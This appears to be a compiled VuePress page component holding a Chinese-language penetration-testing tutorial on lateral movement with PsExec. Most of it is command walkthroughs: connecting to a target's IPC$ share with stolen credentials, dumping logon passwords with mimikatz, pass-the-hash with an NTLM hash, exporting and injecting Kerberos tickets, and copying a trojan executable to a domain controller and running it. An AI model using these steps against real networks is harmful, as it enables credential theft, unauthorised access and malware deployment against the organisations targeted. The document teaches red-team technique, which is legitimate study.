import{_ as e,W as t,X as p,Y as a,Z as n,a0 as c,a1 as i,C as l}from"./framework-b6a07282.js";const o={},r=a("h2",{id:"psexec工具远程命令执行横向移动",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#psexec工具远程命令执行横向移动","aria-hidden":"true"},"#"),n(" PsExec工具远程命令执行横向移动")],-1),u=a("li",null,"PsExec 是 windows 下非常好的一款远程命令行工具。psexec的使用不需要对方主机开方3389端口，只需要对方开启admin$共享 (该共享默认开启)。但是，假如目标主机开启了防火墙，psexec也是不能使用的，会提示找不到网络路径。由于psexec是Windows提供的工具，所以杀毒软件将其列在白名单中。但是PsExec在内网中大杀四方后，很多安全厂商开始将PsExec加入了黑名单",-1),d={href:"https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec",target:"_blank",rel:"noopener noreferrer"},m=i(`<h3 id="psexec使用条件" tabindex="-1"><a class="header-anchor" href="#psexec使用条件" aria-hidden="true">#</a> PsExec使用条件</h3><ol><li>具有正确的的凭证（内存凭证、账号密码、账号NTLM Hash）</li><li>能够建立IPC连接（也就是需要通过smb认证），且目标机器开启了共享（默认开启），并且目标必须开启admin$共享。</li></ol><h3 id="psexec常用参数" tabindex="-1"><a class="header-anchor" href="#psexec常用参数" aria-hidden="true">#</a> PsExec常用参数</h3><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>psexec <span class="token parameter variable">-accepteula</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span>ip <span class="token parameter variable">-u</span> administrator <span class="token parameter variable">-p</span> Aa123456 <span class="token parameter variable">-s</span> cmd.exe <span class="token comment">#建立交互式shell，accepteula防止弹窗</span>
psexec <span class="token punctuation">\\</span><span class="token punctuation">\\</span>ip <span class="token parameter variable">-u</span> administrator <span class="token parameter variable">-p</span> Aa123456 命令 <span class="token comment">#直接执行后面的命令</span>
psexec <span class="token punctuation">\\</span><span class="token punctuation">\\</span>ip <span class="token parameter variable">-u</span> administrator <span class="token parameter variable">-p</span> Aa123456 <span class="token parameter variable">-w</span> c:<span class="token punctuation">\\</span>cmd <span class="token comment">#进入目录为c:\\的交互式shell</span>
psexec <span class="token punctuation">\\</span><span class="token punctuation">\\</span>ip <span class="token parameter variable">-u</span> administrator <span class="token parameter variable">-p</span> Aa123456 <span class="token function">whoami</span> /all <span class="token comment">#执行命令</span>
psexec <span class="token punctuation">\\</span><span class="token punctuation">\\</span>ip <span class="token parameter variable">-u</span> administrator <span class="token parameter variable">-p</span> Aa123456 <span class="token parameter variable">-d</span> c:<span class="token punctuation">\\</span>shell.exe <span class="token comment">#执行可执行文件</span>
psexec <span class="token punctuation">\\</span><span class="token punctuation">\\</span>ip <span class="token parameter variable">-u</span> administrator <span class="token parameter variable">-p</span> Aa123456 <span class="token parameter variable">-h</span> <span class="token parameter variable">-d</span> c:<span class="token punctuation">\\</span>shell.exe <span class="token comment">#UAC的用户权限执行文件</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="实验复现" tabindex="-1"><a class="header-anchor" href="#实验复现" aria-hidden="true">#</a> 实验复现</h3><h4 id="ipc-下的psexec" tabindex="-1"><a class="header-anchor" href="#ipc-下的psexec" aria-hidden="true">#</a> IPC$下的PsExec</h4><h5 id="前提条件-获取到目标的账号和明文密码" tabindex="-1"><a class="header-anchor" href="#前提条件-获取到目标的账号和明文密码" aria-hidden="true">#</a> 前提条件：获取到目标的账号和明文密码</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.将PsExec上传至某机器，且该机器需要取得system或administrator或admin绕过uac权限

<span class="token number">2</span>.与目标建立IPC$
net use <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.1<span class="token punctuation">\\</span>ipc$ <span class="token string">&quot;Aa123456&quot;</span> /user:administrator
net use /delete * /yes <span class="token comment">#删除建立的ipc$</span>

<span class="token number">3</span>.通过psexec远程执行命令
psexec.exe <span class="token parameter variable">-accepteula</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.1 <span class="token function">whoami</span> /all <span class="token comment">#ip不行就换主机的域全名 </span>
psexec.exe <span class="token parameter variable">-accepteula</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.1 ipconfig
copy C:<span class="token punctuation">\\</span>Users<span class="token punctuation">\\</span>fish1<span class="token punctuation">\\</span>Desktop<span class="token punctuation">\\</span>artifact.exe <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.1<span class="token punctuation">\\</span>c$ <span class="token comment">#拷贝木马到目标主机</span>
psexec.exe <span class="token parameter variable">-accepteula</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.1 <span class="token parameter variable">-h</span> <span class="token parameter variable">-d</span> c:<span class="token punctuation">\\</span>artifact.exe <span class="token comment">#执行</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="pth下的psexec" tabindex="-1"><a class="header-anchor" href="#pth下的psexec" aria-hidden="true">#</a> PTH下的PsExec</h4><h5 id="前题条件-获取到目标的账号和ntlm信息" tabindex="-1"><a class="header-anchor" href="#前题条件-获取到目标的账号和ntlm信息" aria-hidden="true">#</a> 前题条件：获取到目标的账号和NTLM信息</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.将PsExec上传至某机器

<span class="token number">2</span>.收集信息
sekurlsa::logonPasswords

<span class="token number">3</span>.需要弄到system权限或administrator权限才可以攻击
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:administrator /domain:hacker.com /ntlm:47bf8039a8506cd67c524a03ff84ba4e <span class="token comment">#命令成功后会在最初的靶机上弹出cmd，攻击完成。</span>

<span class="token number">4</span>.通过psexec远程执行命令
psexec.exe <span class="token parameter variable">-accepteula</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span>controlfish.hacker.com <span class="token function">whoami</span> /all <span class="token comment">#ip不行就换主机的域全名 </span>
psexec.exe <span class="token parameter variable">-accepteula</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.1 ipconfig 
copy C:<span class="token punctuation">\\</span>Users<span class="token punctuation">\\</span>fish1<span class="token punctuation">\\</span>Desktop<span class="token punctuation">\\</span>artifact.exe <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.1<span class="token punctuation">\\</span>c$ <span class="token comment">#拷贝木马到目标主机</span>
psexec.exe <span class="token parameter variable">-accepteula</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.1 <span class="token parameter variable">-h</span> <span class="token parameter variable">-d</span> c:<span class="token punctuation">\\</span>artifact.exe <span class="token comment">#执行</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="ptt下的psexec" tabindex="-1"><a class="header-anchor" href="#ptt下的psexec" aria-hidden="true">#</a> PTT下的PsExec</h4><h5 id="前提条件-该机器上存在高权限票据" tabindex="-1"><a class="header-anchor" href="#前提条件-该机器上存在高权限票据" aria-hidden="true">#</a> 前提条件：该机器上存在高权限票据</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.将PsExec上传至某机器

<span class="token number">2</span>.导出票据
mimikatz privilege::debug 
mimikatz sekurlsa::tickets /export

<span class="token number">3</span>.清除内存中的票据
shell klist <span class="token comment">#查看票据</span>
shell klist purge
mimikatz kerberos::purge

<span class="token number">4</span>.将高权限票据注入内存
mimikatz kerberos::ptt <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">;</span>3ba121<span class="token punctuation">]</span>-2-0-40e10000-Administrator@krbtgt-HACKER.COM.kirbi
mimikatz kerberos::tgt <span class="token comment">#查票</span>

<span class="token number">5</span>.访问域控
shell <span class="token function">dir</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span>controlfish<span class="token punctuation">\\</span>c$ <span class="token comment">#这里一定要计算机名或域名</span>
shell <span class="token function">dir</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span>controlfish.hacker.com<span class="token punctuation">\\</span>c$

<span class="token number">6</span>.通过psexec远程执行命令
psexec.exe <span class="token parameter variable">-accepteula</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span>controlfish.hacker.com <span class="token function">whoami</span> /all <span class="token comment">#ip不行就换主机的域全名 </span>
psexec.exe <span class="token parameter variable">-accepteula</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span>controlfish.hacker.com ipconfig 
copy C:<span class="token punctuation">\\</span>Users<span class="token punctuation">\\</span>fish1<span class="token punctuation">\\</span>Desktop<span class="token punctuation">\\</span>artifact.exe <span class="token punctuation">\\</span><span class="token punctuation">\\</span>controlfish.hacker.com<span class="token punctuation">\\</span>c$ <span class="token comment">#拷贝木马到目标主机</span>
psexec.exe <span class="token parameter variable">-accepteula</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span>controlfish.hacker.com <span class="token parameter variable">-h</span> <span class="token parameter variable">-d</span> c:<span class="token punctuation">\\</span>artifact.exe <span class="token comment">#执行</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,14);function k(v,b){const s=l("ExternalLinkIcon");return t(),p("div",null,[r,a("ul",null,[u,a("li",null,[a("a",d,[n("https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec"),c(s)])])]),m])}const x=e(o,[["render",k],["__file","PsExec工具远程命令执行横向移动.html.vue"]]);export{x as default};
